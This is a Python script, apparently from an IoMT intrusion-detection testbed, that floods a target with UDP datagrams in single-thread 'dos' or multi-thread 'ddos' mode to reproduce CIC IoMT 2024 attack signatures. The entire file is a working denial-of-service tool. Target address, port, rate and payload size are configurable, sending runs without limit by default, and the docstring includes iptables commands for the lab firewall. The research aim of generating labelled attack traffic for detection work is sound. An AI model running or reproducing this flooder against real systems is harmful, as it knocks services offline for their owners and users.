"""
udp_flood_client.py — UDP flood attack.

Blasts UDP datagrams at the target as fast as possible from one or many
threads, generating the TCP_IP-DoS-UDP (serial) and TCP_IP-DDoS-UDP1/2
(parallel) signatures from the CIC IoMT 2024 dataset.

Note: The default firewall iptables rules capture only TCP on port 1883.
To have the firewall classify these packets you must add a UDP rule:
  sudo iptables -I INPUT -p udp --dport <UDP_FLOOD_PORT> -j NFQUEUE --queue-num 0
  sudo iptables -I OUTPUT -p udp --sport <UDP_FLOOD_PORT> -j NFQUEUE --queue-num 0

Two modes:
  --mode dos    Single thread floods (TCP_IP-DoS-UDP).
  --mode ddos   Many threads flood concurrently (TCP_IP-DDoS-UDP1/2).

Environment variables:
  UDP_FLOOD_TARGET_IP    Destination IP (default: GATEWAY_IP)
  UDP_FLOOD_TARGET_PORT  Destination port (default: 1883)
  UDP_FLOOD_THREADS      Threads for ddos mode (default: 10)
  UDP_FLOOD_PAYLOAD_SIZE Datagram size in bytes (default: 1024)
  ATTACK_RATE_HZ         Datagrams per second per thread (0 = max, default: 0)
  ATTACK_BURST_COUNT     Stop after N total datagrams (0 = infinite, default: 0)
  GATEWAY_IP / GATEWAY_PORT
"""

from __future__ import annotations

import os
import socket
import sys
import threading
import time
from pathlib import Path

from dotenv import load_dotenv

load_dotenv(dotenv_path=Path(__file__).resolve().parents[1] / ".env")

GATEWAY_IP   = os.getenv("GATEWAY_IP", "127.0.0.1")
TARGET_IP    = os.getenv("UDP_FLOOD_TARGET_IP", GATEWAY_IP)
TARGET_PORT  = int(os.getenv("UDP_FLOOD_TARGET_PORT", "1883"))
NUM_THREADS  = int(os.getenv("UDP_FLOOD_THREADS", "10"))
PAYLOAD_SIZE = int(os.getenv("UDP_FLOOD_PAYLOAD_SIZE", "1024"))
RATE_HZ      = float(os.getenv("ATTACK_RATE_HZ", "0"))
BURST_COUNT  = int(os.getenv("ATTACK_BURST_COUNT", "0"))

_total_lock  = threading.Lock()
_total_sent  = 0
_stop_event  = threading.Event()

_PAYLOAD = os.urandom(PAYLOAD_SIZE)   # random bytes, fixed once per process


def _flood_loop(thread_id: int) -> None:
    global _total_sent
    sleep_s = 1.0 / RATE_HZ if RATE_HZ > 0 else 0

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except OSError as e:
        print(f"[UDP-FLOOD] thread={thread_id} socket error: {e}", file=sys.stderr)
        return

    try:
        while not _stop_event.is_set():
            try:
                sock.sendto(_PAYLOAD, (TARGET_IP, TARGET_PORT))
            except OSError:
                time.sleep(0.01)
                continue

            with _total_lock:
                _total_sent += 1
                n = _total_sent

            if n % 1000 == 0:
                print(f"[UDP-FLOOD] thread={thread_id:03d}  total_sent={n}")

            if BURST_COUNT > 0 and n >= BURST_COUNT:
                _stop_event.set()
                break

            if sleep_s:
                time.sleep(sleep_s)
    finally:
        sock.close()


def run_dos() -> None:
    print(f"[UDP-FLOOD] Mode: dos (TCP_IP-DoS-UDP)  "
          f"target: {TARGET_IP}:{TARGET_PORT}  payload: {PAYLOAD_SIZE}B")
    try:
        _flood_loop(0)
    except KeyboardInterrupt:
        _stop_event.set()
    print(f"[UDP-FLOOD] Done. Total datagrams: {_total_sent}")


def run_ddos() -> None:
    print(f"[UDP-FLOOD] Mode: ddos (TCP_IP-DDoS-UDP)  "
          f"threads: {NUM_THREADS}  target: {TARGET_IP}:{TARGET_PORT}  payload: {PAYLOAD_SIZE}B")
    threads = [
        threading.Thread(target=_flood_loop, args=(i,), daemon=True)
        for i in range(NUM_THREADS)
    ]
    try:
        for t in threads:
            t.start()
        while not _stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        _stop_event.set()

    for t in threads:
        t.join(timeout=2)
    print(f"[UDP-FLOOD] Done. Total datagrams: {_total_sent}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="UDP flood attack (DoS / DDoS)")
    parser.add_argument("--mode", choices=["dos", "ddos"], default="dos",
                        help="dos: single thread | ddos: multi-thread (default: dos)")
    args = parser.parse_args()

    if args.mode == "ddos":
        run_ddos()
    else:
        run_dos()
